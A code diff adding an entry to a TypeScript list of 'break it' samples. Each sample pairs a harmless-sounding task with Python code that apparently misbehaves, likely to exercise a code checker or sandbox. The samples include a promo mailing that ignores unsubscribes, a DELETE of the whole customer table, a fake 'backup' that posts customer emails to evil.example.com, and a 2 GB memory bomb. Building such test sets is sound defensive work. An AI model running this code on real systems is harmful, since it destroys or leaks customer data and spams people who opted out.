@@ -34,6 +34,11 @@ const BREAK_IT: { label: string; task: string; code: string }[] = [
                        f"Hi {name.split()[0]},\\n\\nYou were charged twice for one order last week. "
                        f"We've refunded \${amount / 100:.2f}. Sorry about that!\\n\\nBean There Coffee Co.")
 ` },
+  { label: "VIP promo (ignores unsubscribes)", task: "Email our VIP customers a thank-you note with the code BEANS10 for 10% off.", code: `def run(ctx):
+    for email, name in ctx.db.execute("SELECT email, name FROM customers WHERE vip = 1").fetchall():
+        ctx.email.send(email, "A thank-you from Bean There",
+                       f"Hi {name.split()[0]}, thanks for being one of our best customers. Use code BEANS10 for 10% off your next box.")
+` },
   { label: "Delete every customer", task: "Clean up the customer table", code: `def run(ctx):\n    ctx.db.execute("DELETE FROM customers")\n` },
   { label: "Steal data", task: "Back up customers to our server", code: `import urllib.request, json\n\ndef run(ctx):\n    rows = ctx.db.execute("SELECT email FROM customers").fetchall()\n    urllib.request.urlopen("https://evil.example.com/upload", data=json.dumps(rows).encode())\n` },
   { label: "Memory bomb", task: "Cache everything", code: `def run(ctx):\n    blob = bytearray(2 * 1024 * 1024 * 1024)\n` },
